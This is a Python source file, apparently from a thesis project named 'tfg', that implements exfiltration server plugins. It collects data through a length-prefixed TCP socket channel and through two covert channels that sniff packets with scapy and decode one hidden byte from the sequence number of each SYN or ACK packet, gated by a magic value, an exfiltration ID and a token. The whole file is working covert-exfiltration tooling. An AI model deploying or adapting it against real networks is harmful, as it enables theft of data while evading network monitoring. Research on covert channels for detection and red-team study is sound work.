
from __future__ import annotations
from typing import Dict, Any, Iterable, Iterator, Optional
import socket, threading, struct, queue

from tfg.plugins.api import ExfilServerPlugin
from .tcp_common import SEQ_BASE, EOT, MAGIC, iter_chunks_from_bytes

# ---------- LENGTH (socket TCP normal) ----------
class _TcpStore:
    def __init__(self) -> None:
        self.q: "queue.Queue[bytes]" = queue.Queue()
        self.done = threading.Event()

    def put(self, b: bytes) -> None:
        self.q.put(b)

    def close(self) -> None:
        self.done.set()
        self.q.put(b"")  # sentinel

    def iter(self) -> Iterator[bytes]:
        while True:
            chunk = self.q.get()
            if chunk == b"" and self.done.is_set():
                break
            if chunk:
                yield chunk

def _read_exact(sock: socket.socket, n: int) -> bytes:
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("conexion cerrada durante lectura")
        buf += chunk
    return buf

def _read_until(sock: socket.socket, marker: bytes) -> bytes:
    buf = bytearray()
    mlen = len(marker)
    while True:
        b = sock.recv(1)
        if not b:
            raise ConnectionError("conexion cerrada durante cabecera")
        buf += b
        if len(buf) >= mlen and bytes(buf[-mlen:]) == marker:
            return bytes(buf[:-mlen])

def _parse_preamble(data: bytes) -> Dict[str, str]:
    lines = data.decode("utf-8", errors="ignore").split("\n")
    out: Dict[str,str] = {}
    if not lines or not lines[0].startswith("TFG/1"):
        raise ValueError("preamble invalido")
    for line in lines[1:]:
        line = line.strip()
        if not line:
            continue
        if line.startswith("AUTH "):
            out["auth"] = line[5:]
        if line.startswith("ID "):
            out["id"] = line[3:]
        if line.startswith("MODE "):
            out["mode"] = line[5:]
    return out

class TcpServerLength(ExfilServerPlugin):
    canal = "TCP"
    metodo = 3  # LENGTH
    name = "tcp_server_length"

    def run(self, config: Dict[str, Any]) -> Iterable[bytes]:
        bind_host = config.get("bind_host") or "0.0.0.0"
        bind_port = int(config.get("bind_port") or 9000)
        exfil_id = config.get("exfil_id") or "default"
        auth_token = config.get("auth_token")

        store = _TcpStore()
        th = threading.Thread(target=self._serve, args=(bind_host, bind_port, exfil_id, auth_token, store), daemon=True)
        th.start()
        return store.iter()

    def _serve(self, bind_host: str, bind_port: int, exfil_id: str, auth_token: Optional[str], store: _TcpStore) -> None:
        END = b"\n\n"
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            srv.bind((bind_host, bind_port))
            srv.listen(1)
            conn, addr = srv.accept()
            try:
                pre = _read_until(conn, END)
                meta = _parse_preamble(pre)
                if auth_token and meta.get("auth") != auth_token:
                    conn.sendall(b"401\n"); conn.close(); return
                if meta.get("id") != exfil_id:
                    conn.sendall(b"409\n"); conn.close(); return
                if meta.get("mode") != "LENGTH":
                    conn.sendall(b"400\n"); conn.close(); return
                conn.sendall(b"200\n")

                while True:
                    hdr = conn.recv(4)
                    if not hdr:
                        break
                    if len(hdr) < 4:
                        hdr += _read_exact(conn, 4 - len(hdr))
                    (n,) = struct.unpack("!I", hdr)
                    if n == 0:
                        break
                    data = _read_exact(conn, n)
                    store.put(data)
            finally:
                try: conn.close()
                except: pass
        finally:
            try: srv.close()
            except: pass
            store.close()

# ---------- RAW encodings (SYN-ACK / SEQ) with scapy ----------
class _RawSession:
    def __init__(self, exfil_id: str, auth_token: Optional[str]):
        self.target_eid = exfil_id.encode("utf-8")
        self.target_tok = (auth_token or "").encode("utf-8")
        self.stage = "magic"
        self.buf = bytearray()
        self.expected = len(MAGIC)
        self.eid_len = None
        self.tok_len = None
        self.body = bytearray()
        self.done = False

    def feed(self, b: int):
        if self.done:
            return None
        if self.stage == "magic":
            self.buf.append(b)
            if len(self.buf) == self.expected:
                if bytes(self.buf) != MAGIC:
                    self.buf.clear()  # keep waiting
                    return None
                self.stage = "eid_len"; self.expected = 1; self.buf.clear()
        elif self.stage == "eid_len":
            self.eid_len = b; self.stage = "eid"; self.expected = self.eid_len; self.buf.clear()
        elif self.stage == "eid":
            self.buf.append(b)
            if len(self.buf) == self.expected:
                if bytes(self.buf) != self.target_eid:
                    # reset
                    self.stage = "magic"; self.buf.clear(); self.expected = len(MAGIC)
                    return None
                self.stage = "tok_len"; self.expected = 1; self.buf.clear()
        elif self.stage == "tok_len":
            self.tok_len = b; self.stage = "tok"; self.expected = self.tok_len; self.buf.clear()
        elif self.stage == "tok":
            self.buf.append(b)
            if len(self.buf) == self.expected:
                if bytes(self.buf) != self.target_tok:
                    self.stage = "magic"; self.buf.clear(); self.expected = len(MAGIC)
                    return None
                self.stage = "body"; self.buf.clear()
        elif self.stage == "body":
            if b == EOT:
                self.done = True
                return bytes(self.body)
            else:
                self.body.append(b)
        return None

class _RawCollector:
    def __init__(self, exfil_id: str, auth_token: Optional[str]):
        self.sess = _RawSession(exfil_id, auth_token)
        self.q: "queue.Queue[bytes]" = queue.Queue()
        self.done = threading.Event()

    def push_symbol(self, v: int):
        out = self.sess.feed(v)
        if out is not None:
            self.q.put(out)
            self.done.set()
            self.q.put(b"")  # sentinel

    def iter(self) -> Iterator[bytes]:
        while True:
            b = self.q.get()
            if b == b"" and self.done.is_set():
                break
            if b:
                yield b

def _sniff_syn(port: int, collector: _RawCollector, iface: Optional[str] = None):
    from scapy.all import sniff, TCP
    def cb(pkt):
        if TCP in pkt and pkt[TCP].dport == port and (pkt[TCP].flags & 0x02):  # SYN
            v = (pkt[TCP].seq - SEQ_BASE) & 0xFF
            collector.push_symbol(v)
    sniff(filter=f"tcp and dst port {port}", prn=cb, store=False, iface=iface)

def _sniff_ack(port: int, collector: _RawCollector, iface: Optional[str] = None):
    from scapy.all import sniff, TCP
    def cb(pkt):
        if TCP in pkt and pkt[TCP].dport == port and (pkt[TCP].flags & 0x10) and not (pkt[TCP].flags & 0x02):  # ACK and not SYN
            v = (pkt[TCP].seq - SEQ_BASE) & 0xFF
            collector.push_symbol(v)
    sniff(filter=f"tcp and dst port {port}", prn=cb, store=False, iface=iface)

class TcpServerSynAck(ExfilServerPlugin):
    canal = "TCP"
    metodo = 1  # SYN-ACK
    name = "tcp_server_synack"

    def run(self, config: Dict[str, Any]) -> Iterable[bytes]:
        bind_port = int(config.get("bind_port") or 9001)
        exfil_id = config.get("exfil_id") or "default"
        auth_token = config.get("auth_token")
        iface = config.get("iface")
        collector = _RawCollector(exfil_id, auth_token)
        th = threading.Thread(target=_sniff_syn, args=(bind_port, collector, iface), daemon=True)
        th.start()
        return collector.iter()

class TcpServerSeq(ExfilServerPlugin):
    canal = "TCP"
    metodo = 2  # SEQUENCE NUMBER
    name = "tcp_server_seq"

    def run(self, config: Dict[str, Any]) -> Iterable[bytes]:
        bind_port = int(config.get("bind_port") or 9002)
        exfil_id = config.get("exfil_id") or "default"
        auth_token = config.get("auth_token")
        iface = config.get("iface")
        collector = _RawCollector(exfil_id, auth_token)
        th = threading.Thread(target=_sniff_ack, args=(bind_port, collector, iface), daemon=True)
        th.start()
        return collector.iter()
